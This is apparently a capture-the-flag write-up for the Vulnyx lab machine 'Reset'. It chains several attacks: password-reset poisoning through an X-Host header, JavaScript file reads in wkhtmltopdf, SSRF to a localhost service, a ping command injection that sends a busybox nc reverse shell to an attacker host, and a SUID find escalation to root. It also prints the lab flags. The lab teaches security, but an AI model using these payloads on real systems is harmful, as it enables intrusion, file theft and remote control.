# Vulnyx: Reset

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `Jackie0x17` |
| **Tools used** | `nmap` · `ffuf` · `exiftool` · `nc` |
| **Tags** | `#PasswordResetPoisoning` `#HostHeaderInjection` `#SSRF` `#CommandInjection` `#SUID` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

The password reset flow trusts a custom header to build the reset link it "sends," letting the link be redirected to an attacker-controlled server and its token captured directly. That gets admin access, where a note rendered into a PDF is used to smuggle in a JavaScript payload that reads files on the server itself — revealing an internal service on `127.0.0.1:9000` vulnerable to command injection through a `ping` utility. That's enough for a reverse shell, and a directly SUID `find` binary reaches root with no `sudo` involved at all.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn reset.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:AA:72:C7 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV reset.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: 400 Bad Request
MAC Address: 08:00:27:AA:72:C7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://reset.nyx
```

<img src="../Images/reset/Pasted image 20260719175353.png"/>

A content scan maps out the app — a login/register system with the full password-reset flow (`forgot_password.php`, `change_password.php`), a `notes/` area, and a `dashboard.php` behind auth:

```bash
$ ffuf -u http://reset.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 66ms]
images                 [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 95ms]
index.php              [Status: 200, Size: 6106, Words: 2203, Lines: 167, Duration: 315ms]
login.php              [Status: 200, Size: 780, Words: 132, Lines: 31, Duration: 109ms]
register.php           [Status: 200, Size: 859, Words: 159, Lines: 33, Duration: 80ms]
notes                  [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 15ms]
logout.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
config.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
forgot_password.php    [Status: 200, Size: 727, Words: 110, Lines: 27, Duration: 15ms]
dashboard.php          [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
change_password.php    [Status: 200, Size: 427, Words: 45, Lines: 10, Duration: 57ms]
server-status          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 3ms]
```

Registering an account and logging in gives a first look at the dashboard, and the `forgot_password.php` form is the interesting piece — a reset flow is exactly the kind of feature that trusts client-supplied data it shouldn't:

```
http://reset.nyx/register.php
```

<img src="../Images/reset/Pasted image 20260719171419.png"/>
<img src="../Images/reset/Pasted image 20260719171513.png"/>

```
http://reset.nyx/forgot_password.php
```

<img src="../Images/reset/Pasted image 20260719182234.png"/>

## Initial Access

### Password Reset Poisoning via Host Header

The reset request includes a custom `X-Host` header alongside the normal `Host`:

```http
POST /forgot_password.php HTTP/1.1
Host: reset.nyx
X-Host: <ATTACKER_IP>
Cookie: PHPSESSID=ho3n2bvplvqbfptlpjg3n763tp

email=admin%40reset.nyx
```

<img src="../Images/reset/Pasted image 20260719182328.png"/>
<img src="../Images/reset/Pasted image 20260719182648.png"/>

If the application builds the password reset link it emails using a header value like this instead of a fixed, trusted hostname, the link sent to `admin@reset.nyx` points at whatever the request's `X-Host` says — the attacker's own machine, in this case. A simple HTTP server catches the visit (and the token) when the admin's client opens that link:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
<ATTACKER_IP> - - [19/Jul/2026 11:24:52] code 404, message File not found
<ATTACKER_IP> - - [19/Jul/2026 11:24:52] "GET /style.css HTTP/1.1" 404 -
<IP_Victim> - - [19/Jul/2026 11:25:03] code 404, message File not found
<IP_Victim> - - [19/Jul/2026 11:25:03] "GET /change_password.php?token=93e0a4ffab1b5370991e7055e9330bad HTTP/1.1" 404 -
```

The captured token is fed back to the *real* server's reset page to set a new password for `admin`:

```
http://reset.nyx/change_password.php?token=93e0a4ffab1b5370991e7055e9330bad
```

<img src="../Images/reset/Pasted image 20260719172604.png"/>
<img src="../Images/reset/Pasted image 20260719172633.png"/>
<img src="../Images/reset/Pasted image 20260719172742.png"/>

### An Admin Notes PDF

Logged in as admin, the dashboard's notes feature (the `notes/` area the scan flagged) holds a generated PDF: `2026-07-19_admin_notes.pdf`. Its metadata is inspected:

```bash
$ exiftool 2026-07-19_admin_notes.pdf
ExifTool Version Number         : 13.55
File Name                       : 2026-07-19_admin_notes.pdf
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2026:07:19 11:32:55-04:00
File Access Date/Time           : 2026:07:19 11:32:55-04:00
File Inode Change Date/Time     : 2026:07:19 11:32:55-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           :
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 4.8.7
Create Date                     : 2026:07:19 12:28:57-05:00
Page Count                      : 1
Page Mode                       : UseOutlines
```

The `Creator: wkhtmltopdf` field is the tell: the PDF is generated server-side from a note's HTML by `wkhtmltopdf`, an engine that renders HTML — and executes embedded JavaScript — into a PDF. So a note whose body contains HTML/JS gets that script *run inside `wkhtmltopdf` on the server* when the notes PDF is generated. The note body is the injection point.

Each `<script>`/`<iframe>` below is the body of such a note, created through the dashboard's notes feature; generating that note's PDF is what renders the payload through `wkhtmltopdf` and runs it server-side.

### Local File Read via the PDF

The payload issues an `XMLHttpRequest` to a `file://` URL, base64-encodes the response, and writes it into the rendered page (chunked into 100-character lines to survive layout):

```html
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

<img src="../Images/reset/Pasted image 20260719173425.png"/>
<img src="../Images/reset/Pasted image 20260719173557.png"/>

The output is base64-encoded and split into lines, so it's reassembled and decoded locally:

```bash
$ echo '<base64 output>' | base64 -d
```

<img src="../Images/reset/Pasted image 20260719173930.png"/>

The same technique is pointed at Apache's port configuration instead, to map what the server is actually running:

```html
<script>
	x.open("GET", "file:///etc/apache2/ports.conf");
	x.send();
</script>
```

<img src="../Images/reset/Pasted image 20260719174016.png"/>
<img src="../Images/reset/Pasted image 20260719174041.png"/>

```bash
$ echo '<base64 output>' | base64 -d
```

<img src="../Images/reset/Pasted image 20260719174206.png"/>

This reveals `Listen 127.0.0.1:9000` — a service bound only to localhost, invisible to an external scan but reachable from the server itself.

### SSRF into an Internal Service

Since the payload runs inside the server's own renderer, it can reach that localhost-only service. An `<iframe>` (rather than an `XMLHttpRequest`) renders the internal service's interface straight into the PDF:

```html
<iframe src="http://127.0.0.1:9000/" width="800" height="1000"></iframe>
```

<img src="../Images/reset/Pasted image 20260719174243.png"/>
<img src="../Images/reset/Pasted image 20260719174342.png"/>

It exposes a `ping` utility through an API endpoint. Its `host` parameter is tested for command injection — a `ping` tool that shells out to the system `ping` is a classic injection point:

```html
<iframe src="http://127.0.0.1:9000/api.php/utils/ping?host=127.0.0.1|id" style="width:100%; height:500px;"></iframe>
```

<img src="../Images/reset/Pasted image 20260719174429.png"/>
<img src="../Images/reset/Pasted image 20260719174513.png"/>

The `host` value clearly reaches a shell unsanitized — a pipe chains an arbitrary second command onto the legitimate `ping`. The same technique triggers a reverse shell, with `${IFS}` standing in for spaces (a common way around filters or parsing that break on literal whitespace):

```html
<iframe src="http://127.0.0.1:9000/api.php/utils/ping?host=127.0.0.1|busybox${IFS}nc${IFS}<ATTACKER_IP>${IFS}<PORT>${IFS}-e${IFS}sh" style="width:100%; height:500px;"></iframe>
```

<img src="../Images/reset/Pasted image 20260719174802.png"/>

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [reset.nyx] 34726
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

### A Directly SUID `find`

A sweep for SUID binaries turns up something that shouldn't be there — `find` itself carries the bit:

```bash
find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/find
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/find/`

Because the SUID bit makes `find` run as its owner (root), no `sudo` rule is needed at all. `find`'s `-exec` runs a command with those inherited privileges, and `-p` keeps the shell from dropping them:

```bash
find . -exec /bin/sh -p \; -quit
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

The `euid=0(root)` confirms root privileges, enough to read both flags:

```bash
ls -l /home
total 4
drwxr-x---    3 zuha     zuha          4096 Sep 21  2025 zuha
cat /home/zuha/user.txt
2e97325651d5978bfa106751c438c8d6
ls -l /root
total 4
-rw-r--r--    1 root     root            33 Sep 20  2025 root.txt
cat /root/root.txt
7ce6f0c892e3be3ac4e6c37d3501fc49
```

> **User flag:** `2e97325651d5978bfa106751c438c8d6`
> **Root flag:** `7ce6f0c892e3be3ac4e6c37d3501fc49`

Both flags come from the same shell, since the SUID `find` reaches root directly with no separate low-privilege foothold needed first.

## Takeaways

- Any "password reset" flow that builds its link from a request header (`Host`, `X-Forwarded-Host`, a custom header like `X-Host` here) instead of a fixed, server-side-known hostname is vulnerable to having that link redirected anywhere the header says — capturing a reset token this way doesn't require breaking anything cryptographic, just controlling where the victim's client ends up.
- File content and metadata (a note body, PDF fields, image EXIF) are a real code-injection surface when anything downstream processes them without sanitization — a server-side HTML-to-PDF renderer like `wkhtmltopdf` is a good example of why "just text" can become code execution.
- A service bound to `127.0.0.1` is still reachable through SSRF from anything that can make the server itself issue a request on the attacker's behalf — the isolation only holds against direct network access, not against a vulnerable app acting as a proxy.
- A directly SUID binary (as opposed to one granted through `sudo`) needs no sudoers entry at all — routine SUID enumeration (`find / -perm -4000`) should be one of the first privilege-escalation checks on any box.